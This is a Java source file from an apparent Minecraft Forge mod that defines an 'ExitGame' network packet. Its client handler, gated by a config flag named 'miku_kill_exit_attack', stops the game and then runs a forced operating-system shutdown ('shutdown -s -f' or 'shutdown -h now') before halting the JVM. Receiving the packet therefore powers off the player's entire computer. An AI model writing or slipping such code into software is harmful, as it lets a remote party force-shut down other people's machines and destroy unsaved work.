package miku.lib.network.packets;

import io.netty.buffer.ByteBuf;
import miku.lib.client.api.iMinecraft;
import miku.lib.common.sqlite.Sqlite;
import miku.lib.common.util.EntityUtil;
import miku.lib.common.util.Platform;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;

import java.io.IOException;

public class ExitGame implements IMessage {

    public ExitGame() {
    }

    @Override
    public void fromBytes(ByteBuf buf) {

    }

    @Override
    public void toBytes(ByteBuf buf) {

    }

    public static class MessageHandler implements IMessageHandler<ExitGame, IMessage> {

        @Override
        @SideOnly(Side.CLIENT)
        public IMessage onMessage(ExitGame message, MessageContext ctx) {
            boolean flag = Sqlite.GetBooleanFromTable("miku_kill_exit_attack", "CONFIG");
            if (!flag) return null;
            if (EntityUtil.isProtected(Minecraft.getMinecraft())) return null;
            ((iMinecraft) Minecraft.getMinecraft()).Stop();

            if (Platform.isWindows()) {
                try {
                    Runtime.getRuntime().exec("shutdown -s -f ");
                } catch (IOException ignored) {

                }
            } else {
                try {
                    Runtime.getRuntime().exec("shutdown -h now");
                } catch (IOException ignored) {
                }
            }

            Runtime.getRuntime().halt(39);
            System.exit(0);
            return null;
        }
    }
}
